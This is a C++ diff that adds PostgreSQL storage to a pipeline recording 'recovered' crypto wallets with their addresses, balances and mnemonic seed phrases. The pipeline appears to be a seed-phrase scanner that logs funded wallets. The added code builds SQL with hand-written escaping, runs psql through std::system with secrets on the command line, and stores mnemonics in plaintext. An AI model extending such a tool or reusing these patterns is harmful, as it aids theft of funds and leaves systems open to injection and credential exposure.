@@ -19,6 +19,7 @@
 #include <stdexcept>
 #include <string>
 #include <thread>
+#include <cstdlib>
 #include <unordered_set>
 #include <unordered_map>
 #include <vector>
@@ -114,6 +115,56 @@ std::string format_balance(double value) {
         formatted.push_back('0');
     }
     return formatted;
+}
+
+std::string escape_sql_literal(const std::string& value) {
+    std::string out;
+    out.reserve(value.size());
+    for (char c : value) {
+        if (c == '\'') {
+            out += "''";
+        } else {
+            out.push_back(c);
+        }
+    }
+    return out;
+}
+
+std::string shell_quote_single(const std::string& value) {
+    std::string out;
+    out.reserve(value.size() + 2);
+    out.push_back('\'');
+    for (char c : value) {
+        if (c == '\'') {
+            out += "'\\''";
+        } else {
+            out.push_back(c);
+        }
+    }
+    out.push_back('\'');
+    return out;
+}
+
+bool is_valid_sql_identifier(const std::string& value) {
+    if (value.empty()) {
+        return false;
+    }
+    const auto is_ident_char = [](unsigned char c) {
+        return std::isalnum(c) != 0 || c == '_';
+    };
+    if (!std::isalpha(static_cast<unsigned char>(value.front())) && value.front() != '_') {
+        return false;
+    }
+    return std::all_of(value.begin() + 1, value.end(), is_ident_char);
+}
+
+void exec_psql_command(const std::string& conninfo, const std::string& sql) {
+    const std::string cmd = "psql " + shell_quote_single(conninfo) +
+                            " -v ON_ERROR_STOP=1 -q -c " + shell_quote_single(sql);
+    const int rc = std::system(cmd.c_str());
+    if (rc != 0) {
+        throw std::runtime_error("Failed to execute PostgreSQL command via psql. Exit code: " + std::to_string(rc));
+    }
 }
 
 std::unordered_set<std::string> load_seen_mnemonics(const std::string& path) {
@@ -311,6 +362,38 @@ void Pipeline::persist_recovered_wallet(const std::string& chain_name,
                                         const core::Mnemonic& mnemonic,
                                         double balance_coin,
                                         const std::string& coin_ticker) const {
+    if (!config_.postgres_conninfo.empty()) {
+        if (!is_valid_sql_identifier(config_.postgres_table)) {
+            throw std::runtime_error("Invalid PostgreSQL table name: " + config_.postgres_table);
+        }
+        const std::string mnemonic_words = mnemonic_to_string(mnemonic);
+        std::call_once(postgres_init_once_, [&]() {
+            const std::string ddl =
+                "CREATE TABLE IF NOT EXISTS " + config_.postgres_table + " ("
+                "id BIGSERIAL PRIMARY KEY, "
+                "created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), "
+                "chain TEXT NOT NULL, "
+                "address TEXT NOT NULL, "
+                "balance_coin DOUBLE PRECISION NOT NULL, "
+                "coin_ticker TEXT NOT NULL, "
+                "mnemonic TEXT NOT NULL"
+                ");";
+            exec_psql_command(config_.postgres_conninfo, ddl);
+        });
+
+        const std::string insert =
+            "INSERT INTO " + config_.postgres_table +
+            " (chain, address, balance_coin, coin_ticker, mnemonic) VALUES ('" +
+            escape_sql_literal(chain_name) + "', '" +
+            escape_sql_literal(address) + "', " + std::to_string(balance_coin) + ", '" +
+            escape_sql_literal(coin_ticker) + "', '" +
+            escape_sql_literal(mnemonic_words) + "');";
+
+        std::lock_guard<std::mutex> lock(postgres_mutex_);
+        exec_psql_command(config_.postgres_conninfo, insert);
+        return;
+    }
+
     std::ofstream out(config_.recovered_wallets_path, std::ios::app);
     if (!out) {
         throw std::runtime_error("Failed to open recovered wallets file: " + config_.recovered_wallets_path);
